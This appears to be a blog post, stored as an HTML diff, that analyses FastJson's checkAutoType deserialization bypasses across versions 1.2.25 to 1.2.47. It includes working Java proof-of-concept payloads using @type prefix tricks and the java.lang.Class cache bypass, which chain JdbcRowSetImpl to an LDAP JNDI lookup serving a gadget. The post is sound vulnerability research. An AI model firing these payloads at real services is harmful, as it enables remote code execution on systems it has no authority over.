@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            FastJson(2): 漏洞分析
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第二次和这玩意对线了，第一次是23年中。这次终于懂了。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/fastjson(2)-parse-vul/image-20240301144413092.png" alt="image-20240301144413092.png"></p>
+<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7027">https://xz.aliyun.com/t/7027</a></p>
+<p>1、自1.2.25之后，多了个checkAutoType方法。这个方法的位置：在parseObject里，扫描到@type后准备获取class之前。</p>
+<p>2、checkAutoType方法的作用：检查不合法的类，若类合法，最后返回一个Class，用于后续创建对象。</p>
+<p>3、在checkAutoType里，调用了很多次三种方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TypeUtils.getClassFromMapping(typeName)</span><br><span class="line"></span><br><span class="line">deserializers.findClass(typeName);</span><br><span class="line"></span><br><span class="line">TypeUtils.loadClass(typeName, defaultClassLoader); // 第二个参数在checkAutoType方法中是null</span><br></pre></td></tr></table></figure>
+
+<p>getClassFromMapping作用：从一个<strong>静态</strong>变量mapping里根据typeName取出class对象。</p>
+<p>findClass作用：在一个成员变量buckets里根据typeName取出class对象。</p>
+<p>loadClass作用：若typeName以<code>[</code>开头，或以<code>L</code>开头且分号结尾，都去掉头尾这些字符。再类加载typeName，再将加载得到的class对象和typeName put进mapping。</p>
+<p>4、我debug分析一会后，独立写出了一种针对于41、42、43版本的poc。无需手动设置autoType为true。与25-47的通杀poc本质相同，但路径有些许不同。</p>
+<h1 id="checkAutoType"><a href="#checkAutoType" class="headerlink" title="checkAutoType"></a>checkAutoType</h1><p>在1.2.25中，该方法逻辑概括如下，各版本变更都用注释标出。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 1.2.42增加1、若类名长度&lt;3或&gt;128，则抛异常</span><br><span class="line">// 1.2.42增加2: 检查类名开头是否是L和结尾是否是分号，若是则都去掉。这导致了双写绕过</span><br><span class="line">// 在1.2.43中修改双写绕过的逻辑：由去掉开头的L和结尾的分号修改为：若开头是LL且结尾是;;，则异常，若开头是L且结尾是;，则去掉L和分号。但是没有注意到 [ 这个符号可以绕过。</span><br><span class="line">// 在1.2.44中：直接不允许 L和[ 开头</span><br><span class="line"></span><br><span class="line">    if (autoTypeSupport || expectClass != null) &#123;</span><br><span class="line">        // 先检查白名单，符合白名单则直接返回</span><br><span class="line">        // 再检查黑名单，符合则抛异常</span><br><span class="line">        // 从1.2.42 开始，这里的黑名单由明文变成了哈希</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line"></span><br><span class="line">    if (clazz == null) &#123;</span><br><span class="line">        clazz = deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (clazz != null) &#123;</span><br><span class="line">        if (expectClass != null &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        return clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!autoTypeSupport) &#123;</span><br><span class="line">        // 先检查白名单，符合白名单则直接返回</span><br><span class="line">        // 再检查黑名单，符合则抛异常</span><br><span class="line">        // 从1.2.42 开始，这里的黑名单由明文变成了哈希</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if (autoTypeSupport || expectClass != null) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (autoTypeSupport || expectClass != null) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	/*</span><br><span class="line">	在41版本中，上面两个if合并修改为如下的：</span><br><span class="line">    if (clazz == null) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);</span><br><span class="line">    &#125;</span><br><span class="line">    */</span><br><span class="line">     </span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    if (!autoTypeSupport) &#123;</span><br><span class="line">        throw new JSONException(&quot;autoType is not support. &quot; + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">    return clazz;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="unk’s-poc"><a href="#unk’s-poc" class="headerlink" title="unk’s poc"></a>unk’s poc</h1><p>主要在41 42 43 版本可打。</p>
+<p>原理：执行两次checkAutoType，第一次进入TypeUtils.loadClass，让JdbcRowSetImpl被put进mapping。第二次则可以从TypeUtils.getClassFromMapping获取到JdbcRowSetImpl了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  public static void main(String[] args) throws Exception&#123;</span><br><span class="line">String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;&#125;&quot;; //41</span><br><span class="line">//String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;&#125;&quot;; //42</span><br><span class="line">//String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;&#125;&quot;; //43</span><br><span class="line">      System.out.println(PoC);</span><br><span class="line">      try&#123;</span><br><span class="line">          JSON.parse(PoC);</span><br><span class="line">      &#125;catch (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">      Object pojoNodeChainPoc = Gadget.getPOJONodeChainPoc(&quot;fj_1_2_25to1_2_41.Poc1&quot;);</span><br><span class="line">      new LDAPServer(17777, Util.serialize(pojoNodeChainPoc)).start();</span><br><span class="line">      PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:17777/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;</span><br><span class="line">      JSON.parse(PoC);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="25-47-通杀"><a href="#25-47-通杀" class="headerlink" title="25-47 通杀"></a>25-47 通杀</h1><p>主思路仍是想办法先执行<code>TypeUtils.loadClass</code>，后面就可以从<code>getClassFromMapping</code>获取。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">    String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;&quot;;</span><br><span class="line">    System.out.println(PoC);</span><br><span class="line">    JSON.parse(PoC);</span><br><span class="line">    Object pojoNodeChainPoc = Gadget.getPOJONodeChainPoc(&quot;fj_1_2_25to1_2_41.Poc1&quot;);</span><br><span class="line">    new LDAPServer(17777, Util.serialize(pojoNodeChainPoc)).start();</span><br><span class="line">    PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:17777/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;</span><br><span class="line">    JSON.parse(PoC);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一次parse时，获取到Class，准备进行deserialze。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/fastjson(2)-parse-vul/image-20240301104602258.png" alt="image-20240301104602258.png"></p>
+<p>在deserialze中，会对JSON里的val字段loadClass。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/fastjson(2)-parse-vul/image-20240301104638516.png" alt="image-20240301104638516.png"></p>
+<p>loadClass加入mapping，那么第二次checkAutoType就能获取jdbcrowset。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/fastjson(2)-parse-vul/image-20240301105120667.png" alt="image-20240301105120667.png"></p>
+<p>由于第一次parse不会抛出异常，那么两个json可以合并为一个，就是网上常见的通杀poc。</p>
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text">概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#checkAutoType"><span class="toc-text">checkAutoType</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#unk%E2%80%99s-poc"><span class="toc-text">unk’s poc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#25-47-%E9%80%9A%E6%9D%80"><span class="toc-text">25-47 通杀</span></a></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
